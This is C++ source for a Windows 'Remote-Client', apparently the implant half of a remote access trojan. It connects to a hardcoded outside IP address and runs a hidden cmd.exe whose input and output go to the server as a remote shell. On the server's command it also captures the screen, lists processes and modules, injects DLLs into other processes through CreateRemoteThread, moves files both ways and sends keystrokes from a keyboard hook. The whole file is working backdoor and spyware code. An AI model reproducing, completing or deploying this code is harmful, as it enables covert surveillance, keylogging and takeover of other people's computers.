﻿// Remote-Client.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Remote-Client.h"
#include<iostream>
#include<WinSock2.h>
#include<Windows.h>
#pragma comment(lib,"ws2_32.lib")
#include"DATA.h"
#include<thread>
#include<TlHelp32.h>
#include <fstream>
#pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
using namespace std;
int mykeyboardhook(HWND hwnd);

#define MAX_LOADSTRING 100


// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

DWORD dwsendticket;   //最后发包时间戳
DWORD dwrecvticket;  //最后收包时间戳
HANDLE hevent = CreateEvent(NULL, false, false, NULL);

bool ret;

HANDLE myhwritepipe;
HANDLE cmdhreadpipe;

HANDLE cmdhwritepipe;
HANDLE myhreadpipe;

SOCKET s;
DWORD dwpid;

DWORD WINAPI heartbeatthread(LPVOID lparam)
{
    bool bret = false;
    char* pdata = NULL;
    dwsendticket = GetTickCount();  //获取当前 发包 时间戳
    dwrecvticket = GetTickCount();


    while (true)
    {
        
        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
        {
            SetEvent(hevent);
            /*closesocket(s);*/
            break;
        }
        else if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME)
        {
            senddatahead(s, Client_BEAT);
            dwsendticket = GetTickCount();
        }
        Sleep(HEART_BEAT_TIME);

    }

    return true;

}

bool sendcapture(SOCKET s)
{
    HWND hdesktop = NULL;
    HDC hdesktopdc = NULL; //
    HDC hdc = NULL;
    HBITMAP hbitmap = NULL;
    char* pbitmapbuf = NULL;
    int desktopwidth = 0;
    int desktopheight = 0;
    bool result = true;

    try
    {
        //过去桌面窗口句柄
        hdesktop = GetDesktopWindow();

        //获取桌面DC
        hdesktopdc = GetDC(hdesktop);
        if (hdesktop == NULL)
        {
            throw "error";
        }

        //创建DC
        hdc = CreateCompatibleDC(hdesktopdc);
        
        desktopwidth = GetSystemMetrics(SM_CXFULLSCREEN);
        desktopheight = GetSystemMetrics(SM_CYFULLSCREEN);

        //创建与桌面相兼容的位图
        hbitmap = CreateCompatibleBitmap(hdesktopdc, desktopwidth, desktopheight);

        if (hbitmap == NULL)
        {
            throw "error";
        }

        //将创建的DC与位图关联
        SelectObject(hdc, hbitmap);

        //桌面DC数据拷贝给创建的DC
        bool ret = BitBlt(
            hdc,
            0,
            0,
            desktopwidth,
            desktopheight,
            hdesktopdc,
            0,
            0,
            SRCCOPY
            );
        if (!ret)
        {
            throw "error";
        }

        //从内存DC中获取位图
        int bufsize = desktopwidth * desktopheight * 4+8;
        //多加八个字节方便服务端接受获取宽高
        pbitmapbuf = new char[bufsize];
        if (pbitmapbuf == NULL)
        {
            throw "error";
        }

        screendata* pscreendata = (screendata*)pbitmapbuf;
        pscreendata->width = desktopwidth;
        pscreendata->height = desktopheight;

        LONG reallybitsize = GetBitmapBits(hbitmap, bufsize-8, pbitmapbuf+8);
        if (reallybitsize == 0)
        {
            throw "error";
        }

        //向服务端发送SCREEN数据
        senddata(s, CLIENT_SCREEN_BACK, (char*)pscreendata, bufsize);


    }


    catch (...)
    {
        result = false;
    }

    if (hdesktopdc != NULL)
    {
        ReleaseDC(hdesktop, hdesktopdc);
    }
    if (hdc != NULL)
    {
        DeleteDC(hdc);
    }
    if (hbitmap != NULL)
    {
        DeleteObject(hbitmap);
    }
    if (pbitmapbuf != NULL)
    {
        delete[] pbitmapbuf;
    }

    return result;
}

DWORD WINAPI recvandsendthread(LPVOID lparam)
{
    bool bret = false;
    char* pdata = NULL;
    while (true)
    {
        /*char rbuf[30] = { 0 };
        getdate = recv(s, rbuf, sizeof(unsigned int)*2, 0);
        DATA* drbuf = (DATA*)rbuf;*/

        //收取头部数据
        DATA drbuf;
        bret = recvdata(s, (char*)&drbuf, sizeof(unsigned int) * 2);
        if (bret <= 0) return 0;

        senddatahead(s, Client_BEAT);

        dwrecvticket = GetTickCount();   //收到包 刷新最后收包时间戳

        //后面有数据继续收取
        if (drbuf.length >= 0)
        {
            pdata = new char[drbuf.length+5];
            memset(pdata, 0, drbuf.length+5);
            if (pdata == NULL) return 0;

            recvdata(s, pdata, drbuf.length);

            //cmd请求
            if (drbuf.type == SEVER_CMD_COMMAND)
            {
                senddatahead(s, CLIENT_CMD_BACK);
                if (drbuf.length != 0)
                {
                    DWORD realwlength;
                    DWORD wlength = strlen(pdata);
                    pdata[wlength++] = '\n';
                    WriteFile(myhwritepipe, pdata, wlength, &realwlength, NULL);
                }


                while (TRUE)
                {
                    Sleep(100);
                    DWORD isnull = 0;
                    ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
                    if (!isnull)  break;

                    char backdata[300] = { 0 };
                    DWORD realrlength;
                    ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
                    char size[300] = { 0 };
                    DATA* cmdback = (DATA*)size;
                    cmdback->length = strlen(backdata) + 1;
                    cmdback->type = CLIENT_CMD_BACK;
                    memcpy(cmdback->reallydata, backdata, cmdback->length);
                    send(s, (char*)cmdback, cmdback->length + sizeof(unsigned int) * 2, 0);

                }
            }  

            //屏幕监控请求
            else if (drbuf.type == SERVER_SCREEN_COMMAND)
            {
                sendcapture(s);
            }

            //进程遍历
            else if (drbuf.type == SERVER_PROCESS_GET)
            {

                HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

                PROCESSENTRY32 pe32 = { 0 };
                pe32.dwSize = sizeof(PROCESSENTRY32);
                bool bret = Process32First(hsnap, &pe32);

                senddata(s, CLIENT_PROCESS_BACK, (char*)&pe32, pe32.dwSize); 

                while (bret)
                {
                    bret = Process32Next(hsnap, &pe32);

                    senddata(s, CLIENT_PROCESS_BACK, (char*)&pe32, pe32.dwSize);
                }

            }

            //dll查看
            else if (drbuf.type == SERVER_DLLLIST_VIEW)
            {
                dwpid = *(DWORD*)pdata;

                HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwpid);

                MODULEENTRY32 module32 = { 0 };
                module32.dwSize = sizeof(MODULEENTRY32);

                bret = Module32First(hsnap, &module32);

                senddata(s, CLIENT_DLLDATA_BACK, (char*)&module32, module32.dwSize);

                while (bret)
                {
                    bret = Module32Next(hsnap, &module32);

                    senddata(s, CLIENT_DLLDATA_BACK, (char*)&module32, module32.dwSize);
                }
            }

            //dll注入
            else if (drbuf.type == SERVER_DLLPATH_INJECT)
            {
                //记录KERNEL32.DLL基址
                HANDLE hdestmoduleaddr = NULL;

                //进程pid级注入dll的路径
                dllinjectinf* inf = (dllinjectinf*)pdata;
                dwpid = inf->dwpid;

                HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwpid);

                MODULEENTRY32 module32 = { 0 };
                module32.dwSize = sizeof(MODULEENTRY32);

                bret = Module32First(hsnap, &module32);

                while (bret)
                {
                    bret = Module32Next(hsnap, &module32);
                    std::string str = module32.szExePath;
                    if (str.find("KERNEL32.DLL") != std::string::npos)
                    {
                        //获取目标进程KERNEL.DLL基址
                        hdestmoduleaddr = module32.modBaseAddr;
                    }
                }

                //获取client进程KERNEL32.DLL基址和LoadLibrary函数基址,计算偏移
                //偏移加上目标进程KERNEL32.DLL基址计算出目标进程loadlibrary函数基址
                HMODULE hkernel32 = GetModuleHandleA("KERNEL32.DLL");
                LPVOID lploadlibrary = GetProcAddress(hkernel32, "LoadLibraryA");
                LPVOID destaddr = (char*)lploadlibrary - (char*)hkernel32 + (char*)hdestmoduleaddr;

                //打开目标进程并开辟空间
                HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, dwpid);
                LPVOID lpaddr = VirtualAllocEx(hprocess, NULL, 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                DWORD writebytes = 0;
                /*OutputDebugString(inf->dllpath);*/

                //向开辟空间写入注入dll路径
                bool ret = WriteProcessMemory(hprocess, lpaddr, inf->dllpath, strlen(inf->dllpath), &writebytes);
                if (!ret)
                {
                    VirtualFreeEx(hprocess, lpaddr, 1, MEM_DECOMMIT);
                    return 0;
                }

                //开辟远线程,使目标进程调用LoadLibrary并通过开辟空间获取注入dll的路径作为参数
                HANDLE hRemotethread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)destaddr, lpaddr, 0, NULL);
            }

            //文件接受
            else if (drbuf.type == SERVER_FILE_UP)
            {
                
                senddatahead(s, CLIENT_FILE_DOWN);
                
                if(drbuf.length>0)
                {
                    filedatastruct* fdatastruct = (filedatastruct*)pdata;
                    ofstream file;
                    int a = drbuf.length;

                    file.open(fdatastruct->despath, ios::out | ios::app | ios::binary, _SH_DENYRW);

                    file.write(fdatastruct->filedata, fdatastruct->datasize);
                    file.close();
                }

            }

            //文件发送
            else if (drbuf.type == CLIENT_FILE_DOWN)
            {
                if (drbuf.length == 0)
                {
                    senddatahead(s, CLIENT_FILE_DOWN);
                }
                if (drbuf.length > 0)
                {
                    filedatastruct* fdatastruct = (filedatastruct*)pdata;
                    ifstream file;

                    file.open(fdatastruct->sourcepath, ios::in|ios::binary, _SH_DENYRW);

                    filedatastruct* fds = new filedatastruct;
                    memset(fds, 0, sizeof(filedatastruct));
                    memcpy(fds->despath, fdatastruct->despath, sizeof(fdatastruct->despath));
  
                    while (true)
                    {
                        file.read(fds->filedata, TRANSFER_SIZE);
                        fds->datasize = sizeof(fds->filedata);
                        
                        senddata(s, SERVER_FILE_UP, (char*)fds, sizeof(filedatastruct));
                        if (file.eof()) break;
                    }
                    delete fds;
                    file.close();
                }
            }
        }
        if (pdata != NULL)
        {
            delete[] pdata;
            pdata = NULL;
        }

        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
        {
            break;
        }
        
    }

    //while (true)
    //{
    //    int getdate = 0;
    //    char rbuf[256] = { 0 };
    //    getdate = recv(s, rbuf, sizeof(unsigned int) * 2, 0);
    //    DATA* datapacket = (DATA*)rbuf;
    //    if (getdate > 0)
    //    {
    //        if (datapacket->type == SEVER_CMD_COMMAND)
    //        {
    //            char data[256] = { 0 };
    //            recv(s, data, datapacket->length, 0);
    //            //输出cmd数据
    //            DWORD realwlength;
    //            DWORD wlength = strlen(data);
    //            rbuf[wlength++] = '\n';
    //            WriteFile(myhwritepipe, data, wlength, &realwlength, NULL);


    //            while (TRUE)
    //            {
    //                Sleep(100);
    //                DWORD isnull = 0;
    //                ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
    //                if (!isnull)  break;


    //                char backdatasize[256] = { 0 };
    //                char backdata[256] = { 0 };
    //                DATA* CMD_BACK_DATA = (DATA*)backdatasize;
    //                DWORD realrlength;
    //                ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
    //                CMD_BACK_DATA->type = CLIENT_CMD_BACK;
    //                CMD_BACK_DATA->length = strlen(backdata) + 1;
    //                memcpy(CMD_BACK_DATA->reallydata, backdata, CMD_BACK_DATA->length);
    //                send(s, (char*)CMD_BACK_DATA, 255, 0);

    //            }
    //        }
    //    }
    //    else if (getdate <= 0)
    //    {
    //        //输出xx客户端断开连接
    //        break;
    //    }
    //}
    return true;
}


// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。

    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return 0;
    }

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;


    ret = CreatePipe(&cmdhreadpipe, &myhwritepipe, &sa, 0);
    ret = CreatePipe(&myhreadpipe, &cmdhwritepipe, &sa, 0);

    STARTUPINFO st = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    //TCHAR a[] = TEXT("/c calc");

    st.cb = sizeof(STARTUPINFO);
    st.dwFlags = STARTF_USESTDHANDLES;
    st.hStdInput = cmdhreadpipe;
    st.hStdOutput = cmdhwritepipe;
    st.hStdError = cmdhwritepipe;

    ret = CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &st,
        &pi
        );
    
    std::thread mainthread([&] {

        while (true)
        {
            //1.socket
            s = socket(AF_INET, SOCK_STREAM, 0);
            //2.connet
            sockaddr_in addr;
            int length = sizeof(sockaddr_in);
            addr.sin_family = AF_INET;


            addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
            addr.sin_port = htons(10087);

            connect(s, (sockaddr*)&addr, length);
            //开启心跳包

            //std::thread heartbeatthread([&] {
            //    bool bret = false;
            //    char* pdata = NULL;
            //    DWORD dwsendticket = GetTickCount();  //获取当前 发包 时间戳
            //    dwrecvticket = GetTickCount();


            //    while (true)
            //    {
            //        if (GetTickCount() - dwsendticket > HEART_BEAT_TIME)
            //        {
            //            senddatahead(s, Client_BEAT);
            //            dwsendticket = GetTickCount();
            //        }

            //        if (GetTickCount() - dwrecvticket > HEART_BEAT_TIME * 2)
            //        {
            //            SetEvent(hevent);
            //            closesocket(s);
            //            return;
            //        }

            //        Sleep(HEART_BEAT_TIME);
            //    }
            //    
            //}); 

            CreateThread(0, 0, recvandsendthread, 0, 0, 0);

            CreateThread(0, 0, heartbeatthread, 0, 0, 0);

            WaitForSingleObject(hevent, INFINITE);
        }

    });
    mainthread.detach();
   

    
    //thread recvandsendthread([&]() {


    //    while (true)
    //    {



    //        int getdate = 0;
    //        char rbuf[256] = { 0 };
    //        getdate = recv(s, rbuf, sizeof(unsigned int)*2, 0);
    //        DATA* datapacket = (DATA*)rbuf;
    //        if (getdate > 0)
    //        {
    //            if (datapacket->type == SEVER_CMD_COMMAND)
    //            {
    //                char data[256] = { 0 };
    //                recv(s, data, datapacket->length, 0);
    //                //输出cmd数据
    //                DWORD realwlength;
    //                DWORD wlength = strlen(data);
    //                rbuf[wlength++] = '\n';
    //                WriteFile(myhwritepipe, data, wlength, &realwlength, NULL);


    //                while (TRUE)
    //                {
    //                    Sleep(100);
    //                    DWORD isnull = 0;
    //                    ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
    //                    if (!isnull)  break;


    //                    char backdatasize[256] = { 0 };
    //                    char backdata[256] = { 0 };
    //                    DATA* CMD_BACK_DATA = (DATA*)backdatasize;
    //                    DWORD realrlength;
    //                    ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
    //                    CMD_BACK_DATA->type = CLIENT_CMD_BACK;
    //                    CMD_BACK_DATA->length = strlen(backdata) + 1;
    //                    memcpy(CMD_BACK_DATA->reallydata, backdata, CMD_BACK_DATA->length);
    //                    send(s, (char*)CMD_BACK_DATA, 255, 0);

    //                }
    //            }
    //        }
    //        else if (getdate <= 0)
    //        {
    //            //输出xx客户端断开连接
    //            break;
    //        }
    //    }
    //});

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_REMOTECLIENT, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_REMOTECLIENT));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_REMOTECLIENT));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_REMOTECLIENT);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }


   //取消窗口显示
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   mykeyboardhook(hWnd);


   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COPYDATA:
        {
            PCOPYDATASTRUCT cd = (PCOPYDATASTRUCT)lParam;
            const char* pstr = (const char*)cd->lpData;

            char temp[256] = {0};
            DATA* data = (DATA*)temp;
            data->length = strlen(pstr) + 1;
            data->type = CLIENT_KEYBOARD_BACK;
            memcpy(data->reallydata, pstr, data->length);
            send(s, (char*)data, data->length + sizeof(unsigned int) * 2, 0);
        }
        break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...


            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
